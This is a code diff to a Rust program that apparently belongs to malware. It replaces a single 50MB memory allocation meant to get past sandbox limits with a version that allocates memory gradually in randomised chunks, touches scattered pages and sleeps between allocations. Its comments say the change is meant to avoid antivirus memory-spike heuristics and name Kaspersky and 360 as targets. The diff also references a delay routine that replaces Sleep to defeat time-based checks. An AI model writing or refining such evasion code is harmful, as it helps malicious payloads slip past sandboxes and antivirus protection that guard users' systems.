@@ -43,13 +43,29 @@
         std::thread::sleep(std::time::Duration::from_millis(500));
     }
 
-    // 2. [Anti-Analysis & Evasion] Memory Ballooning and Payload Obfuscation
-    // Allocate a large chunk of memory to bypass automated sandbox memory limits
-    // and delay execution to bypass time-based heuristic checks.
+    // 2. [Anti-Analysis & Evasion] Stealthy Memory Ballooning and Payload Obfuscation
+    // Allocate memory progressively rather than one massive chunk to avoid triggering
+    // local AV memory-spike heuristics (like Kaspersky/360).
     {
-        let mut _balloon: Vec<u8> = vec![0; 50 * 1024 * 1024]; // 50MB balloon
-        for i in 0..1024 {
-            _balloon[i * 4096] = 0x42; // Touch pages to ensure physical allocation
+        let mut _balloon: Vec<Vec<u8>> = Vec::new();
+        // Progressively allocate ~35MB in smaller randomized chunks
+        let mut allocated = 0;
+        let target = 35 * 1024 * 1024;
+        
+        while allocated < target {
+            // Allocate 1-3MB chunks to look like normal app data loading
+            let chunk_size = (rand::random::<u32>() % (2 * 1024 * 1024) + 1024 * 1024) as usize;
+            let mut chunk = vec![0u8; chunk_size];
+            
+            // Touch scattered pages instead of sequential to evade heuristic triggers
+            for i in (0..chunk_size).step_by(8192) {
+                chunk[i] = (i % 255) as u8;
+            }
+            _balloon.push(chunk);
+            allocated += chunk_size;
+            
+            // Micro-sleep between allocations
+            std::thread::sleep(std::time::Duration::from_millis(10));
         }
         
         // Use a customized delay function that calculates primes instead of direct Sleep
